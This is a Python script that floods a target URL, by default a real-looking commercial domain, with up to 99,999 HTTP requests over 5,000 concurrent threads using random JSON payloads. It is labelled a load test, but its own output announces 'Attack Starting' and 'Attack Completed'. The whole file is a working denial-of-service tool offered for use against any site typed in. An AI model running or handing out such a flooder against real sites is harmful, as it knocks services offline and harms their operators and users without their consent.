import requests
import threading
import time
from queue import Queue
import random
import json

# URL Input System
url = input("Target URL: ").strip()
if not url:
    url = "https://smboostzone.com/"

# Configuration
num_threads = 5000               # Running Thread's'
request_limit = 99999            # Total Thread's'
timeout = 5                      # Response Time
http_method = input("Select method EX..GET, PUT, POST, DELETE: ").strip()             # HTTP (GET, POST, PUT, DELETE)
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer YOUR_TOKEN"
}

# Dynamic Payload Generator
def generate_payload():
    return {
        "user_id": random.randint(1, 1000),
        "transaction_id": random.randint(10000, 99999),
        "amount": round(random.uniform(10.0, 1000.0), 2),
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }

# Queue and Metrics
request_queue = Queue()
successful_requests = 0
failed_requests = 0
total_time = 0
metrics_lock = threading.Lock()

def send_request():
    global successful_requests, failed_requests, total_time
    while not request_queue.empty():
        try:
            start_time = time.time()

            if http_method == "GET":
                response = requests.get(url, headers=headers, timeout=timeout)
            elif http_method == "POST":
                payload = generate_payload()
                response = requests.post(url, headers=headers, json=payload, timeout=timeout)
            elif http_method == "PUT":
                payload = generate_payload()
                response = requests.put(url, headers=headers, json=payload, timeout=timeout)
            elif http_method == "DELETE":
                response = requests.delete(url, headers=headers, timeout=timeout)
            else:
                print(f"Unsupported HTTP method: {http_method}")
                return

            elapsed_time = time.time() - start_time
            with metrics_lock:
                successful_requests += 1
                total_time += elapsed_time

            print(f"Status Code: {response.status_code}, Time: {elapsed_time:.2f}s, Payload: {json.dumps(payload, indent=2) if http_method in ['POST', 'PUT'] else 'N/A'}")

        except requests.exceptions.RequestException as e:
            with metrics_lock:
                failed_requests += 1
            print(f"Request failed: {e}")

def generate_requests():
    for _ in range(request_limit):
        request_queue.put(1)

def run_load_test():
    print(f"\n🔫 Attack Starting on: {url}\n")
    start_time = time.time()

    generate_requests()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    end_time = time.time()
    total_elapsed_time = end_time - start_time

    print("\n✅ Attack Completed!")
    print(f"Total Requests: {request_limit}")
    print(f"Successful Requests: {successful_requests}")
    print(f"Failed Requests: {failed_requests}")
    if successful_requests > 0:
        print(f"Average Response Time: {total_time / successful_requests:.2f} seconds")
    print(f"Total Time Taken: {total_elapsed_time:.2f} seconds")

if __name__ == "__main__":
    run_load_test()
